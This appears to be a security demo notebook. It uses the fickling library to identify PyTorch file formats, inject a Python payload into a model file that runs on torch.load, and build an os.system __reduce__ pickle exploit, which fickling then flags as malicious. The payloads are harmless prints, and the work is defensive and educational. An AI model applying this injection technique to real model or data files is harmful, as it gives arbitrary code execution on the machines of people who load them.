# Imports

In [1]:
import os
import pickle
import sys
from pathlib import Path
from typing import Dict, List, Optional, Tuple, Any, Union

import numpy as np
import torch
import torch.nn as nn
import torch.nn.functional as F
import torchvision.models as models

import fickling.analysis as analysis
import fickling.polyglot as polyglot
from fickling.fickle import Pickled
from fickling.pytorch import PyTorchModelWrapper

# PyTorch File Format Identification

In [2]:
def identify_pytorch_formats(
    model_path: Union[str, Path],
    verbose: bool = True
) -> Optional[List[str]]:
    """
    Identify the format of a PyTorch serialized file.
    
    Args:
        model_path: Path to the PyTorch model file
        verbose: Whether to print identification results
        
    Returns:
        List of potential file formats, or None if identification fails
        
    Raises:
        FileNotFoundError: If the model file doesn't exist
        ValueError: If the file path is invalid
    """
    # Validate input path
    if not model_path:
        raise ValueError("Model path cannot be empty")
    
    model_path = Path(model_path)
    
    if not model_path.exists():
        raise FileNotFoundError(f"Model file not found: {model_path}")
    
    try:
        # Use fickling's polyglot module to identify the file format
        potential_formats = polyglot.identify_pytorch_file_format(
            str(model_path),
            print_results=verbose
        )
        
        if verbose:
            print(f"\nSuccessfully identified format(s) for: {model_path.name}")
        
        return potential_formats
        
    except Exception as e:
        print(f"Error identifying PyTorch file format: {e}", file=sys.stderr)
        return None

In [3]:
def create_sample_pytorch_models() -> Tuple[Path, Path]:
    """
    Create sample PyTorch models in both new and legacy formats.
    
    Returns:
        Tuple containing paths to (new_format_model, legacy_format_model)
        
    Raises:
        RuntimeError: If model creation fails
    """
    try:
        # Load a pre-trained model
        model = models.mobilenet_v2(weights=None)
        
        # Save in new format (PyTorch v1.3+)
        new_format_path = Path("mobilenet_new_format.pth")
        torch.save(model, new_format_path)
        
        # Save in legacy format (PyTorch v0.1.10)
        legacy_format_path = Path("mobilenet_legacy_format.pth")
        torch.save(model, legacy_format_path, _use_new_zipfile_serialization=False)
        
        print(f"Created new format model: {new_format_path}")
        print(f"Created legacy format model: {legacy_format_path}")
        
        return new_format_path, legacy_format_path
        
    except Exception as e:
        raise RuntimeError(f"Failed to create sample models: {e}")

In [11]:
new_format_path, legacy_format_path = create_sample_pytorch_models()

Created new format model: mobilenet_new_format.pth
Created legacy format model: mobilenet_legacy_format.pth


In [12]:
identify_pytorch_formats(new_format_path)

Your file is most likely of this format:  PyTorch v1.3 


Successfully identified format(s) for: mobilenet_new_format.pth


['PyTorch v1.3']

In [13]:
identify_pytorch_formats(legacy_format_path)

Your file may not be a PyTorch file.
                No valid file formats were detected.
                If this is a mistake, raise an issue on our GitHub.

Successfully identified format(s) for: mobilenet_legacy_format.pth


[]

# PyTorch Model Injection

In [4]:
def inject_malicious_payload(
    model_path: Union[str, Path],
    payload: str,
    output_path: Optional[Union[str, Path]] = None,
    injection_method: str = "insertion",
    overwrite: bool = False
) -> Optional[Path]:
    """
    Inject a malicious payload into a PyTorch model file.
    
    WARNING: This function is for security research and education only.
    Never use this on production models without explicit authorization.
    
    Args:
        model_path: Path to the original PyTorch model
        payload: Python code to inject (as string)
        output_path: Path for the injected model (if None, generates automatically)
        injection_method: Method to use for injection ('insertion' or other)
        overwrite: Whether to overwrite the original file
        
    Returns:
        Path to the injected model file, or None if injection fails
        
    Raises:
        FileNotFoundError: If the model file doesn't exist
        ValueError: If parameters are invalid
    """
    # Validate inputs
    if not model_path:
        raise ValueError("Model path cannot be empty")
    
    if not payload or not isinstance(payload, str):
        raise ValueError("Payload must be a non-empty string")
    
    model_path = Path(model_path)
    
    if not model_path.exists():
        raise FileNotFoundError(f"Model file not found: {model_path}")
    
    # Generate output path if not provided
    if output_path is None:
        output_path = model_path.parent / f"injected_{model_path.name}"
    else:
        output_path = Path(output_path)
    
    try:
        # Wrap the model with fickling
        wrapper = PyTorchModelWrapper(str(model_path))
        
        # Inject the payload
        wrapper.inject_payload(
            payload,
            str(output_path),
            injection=injection_method,
            overwrite=overwrite
        )
        
        print(f"Successfully injected payload into: {output_path}")
        print(f"Payload: {payload[:50]}..." if len(payload) > 50 else f"Payload: {payload}")
        
        return output_path
        
    except Exception as e:
        print(f"Error injecting payload: {e}", file=sys.stderr)
        return None

In [8]:
def demonstrate_pytorch_injection() -> None:
    """
    Demonstrate a complete PyTorch injection workflow.
    
    This function creates a benign model, injects a payload,
    and demonstrates the execution of the malicious code.
    """
    try:
        # Step 1: Create a benign model
        print("\nStep 1: Creating benign model...")
        model = models.mobilenet_v2(weights=None)
        benign_path = Path("benign_model.pth")
        torch.save(model, benign_path)
        print(f"Benign model saved to: {benign_path}\n")
        
        # Step 2: Inject payload
        print("\n Step 2: Injecting malicious payload...")
        payload = "print('SECURITY ALERT: Malicious code executed! Never trust a pickle!')"
        injected_path = inject_malicious_payload(
            benign_path,
            payload,
            output_path="./malicious_model.pth",
            overwrite=False
        )
        
        if injected_path is None:
            print("Injection failed")
            return
        
        print()
        
        # Step 3: Load the injected model (this will execute the payload)
        print("Step 3: Loading injected model (payload will execute)...")
        loaded_model = torch.load(injected_path, weights_only=False)
        print("Model loaded successfully\n")
        
        # Step 4: Verify model still works
        print("\nStep 4: Verifying model functionality...")
        loaded_model.eval()
        
    except Exception as e:
        print(f"Demonstration failed: {e}", file=sys.stderr)

In [14]:
demonstrate_pytorch_injection()


Step 1: Creating benign model...
Benign model saved to: benign_model.pth


 Step 2: Injecting malicious payload...
Successfully injected payload into: malicious_model.pth
Payload: print('SECURITY ALERT: Malicious code executed! Ne...

Step 3: Loading injected model (payload will execute)...
SECURITY ALERT: Malicious code executed! Never trust a pickle!
Model loaded successfully


Step 4: Verifying model functionality...


# Numpy Pickle Detection

In [6]:
class MaliciousPayload:
    """
    A malicious class designed to execute code when unpickled.
    
    WARNING: This class is for security research and education only.
    It demonstrates how pickle deserialization can be exploited.
    """
    
    def __init__(self, command: str = "echo 'Malicious code executed!'"):
        """
        Initialize the malicious payload.
        
        Args:
            command: Shell command to execute during unpickling
        """
        self.command = command
        self.data = "benign_data"
    
    def __reduce__(self) -> Tuple[Any, Tuple[str]]:
        """
        Define custom pickle behavior that executes arbitrary code.
        
        The __reduce__ method is called during pickling and can return
        a callable and its arguments, which will be executed during unpickling.
        
        Returns:
            Tuple of (callable, arguments) to execute during unpickling
        """
        return (os.system, (self.command,))

In [16]:
def analyze_pickle_safety(
    pickled_data: bytes,
    verbose: bool = True
) -> Dict[str, Any]:
    """
    Analyze the safety of pickled data using fickling.
    
    Args:
        pickled_data: Pickled data as bytes
        verbose: Whether to print detailed analysis results
        
    Returns:
        Dictionary containing safety analysis results
        
    Raises:
        ValueError: If pickled_data is invalid
    """
    if not pickled_data or not isinstance(pickled_data, bytes):
        raise ValueError("Pickled data must be non-empty bytes")
    
    try:
        # Load the pickled data with fickling
        fickled_object = Pickled.load(pickled_data)
        
        # Perform safety analysis
        safety_results = analysis.check_safety(fickled_object).to_dict()
        
        if verbose:
            print("Fickling Safety Analysis Results")
            print(f"Severity: {safety_results.get('severity', 'Unknown')}")
            print(f"Likely Safe: {safety_results.get('likely_safe', 'Unknown')}")
            
            if 'issues' in safety_results:
                print(f"\nDetected Issues ({len(safety_results['issues'])}):")
                for i, issue in enumerate(safety_results['issues'], 1):
                    print(f"- {i}. {issue}")
        
        return safety_results
        
    except Exception as e:
        print(f"Error analyzing pickle safety: {e}", file=sys.stderr)
        return {"error": str(e), "severity": "UNKNOWN"}

In [17]:
def demonstrate_numpy_detection() -> None:
    """
    Demonstrate NumPy pickle vulnerability detection using fickling.
    
    This function creates a malicious pickled object, saves it as a NumPy file,
    and uses fickling to detect the security threat.
    """
    try:
        # Step 1: Create malicious payload
        print("\nStep 1: Creating malicious payload...")
        payload = MaliciousPayload(
            command="echo 'DANGER: Malicious code would execute here!'"
        )
        print("Malicious payload created\n")
        
        # Step 2: Pickle the malicious object
        print("\nStep 2: Serializing malicious object...")
        pickle_file = Path("malicious_numpy.pickle")
        with open(pickle_file, "wb") as f:
            pickle.dump(payload, f)
        print(f"Malicious pickle saved to: {pickle_file}\n")
        
        # Step 3: Analyze with fickling (BEFORE loading)
        print("\nStep 3: Analyzing with fickling (BEFORE unpickling)...")
        with open(pickle_file, "rb") as f:
            pickled_data = f.read()
        
        safety_results = analyze_pickle_safety(pickled_data, verbose=True)
        
        # Step 4: Demonstrate what would happen WITHOUT fickling
        print("\nStep 4: Demonstrating unsafe loading (controlled environment)...")
        print("WARNING: In production, this would execute malicious code!")
        print("Fickling detected the threat and prevented execution.")
        
        # Clean up
        if pickle_file.exists():
            pickle_file.unlink()
            print(f"Cleaned up: {pickle_file}\n")
        
    except Exception as e:
        print(f"Demonstration failed: {e}", file=sys.stderr)

In [18]:
demonstrate_numpy_detection()


Step 1: Creating malicious payload...
Malicious payload created


Step 2: Serializing malicious object...
Malicious pickle saved to: malicious_numpy.pickle


Step 3: Analyzing with fickling (BEFORE unpickling)...
Fickling Safety Analysis Results
Severity: LIKELY_OVERTLY_MALICIOUS
Likely Safe: Unknown

Step 4: Demonstrating unsafe loading (controlled environment)...
Fickling detected the threat and prevented execution.
Cleaned up: malicious_numpy.pickle

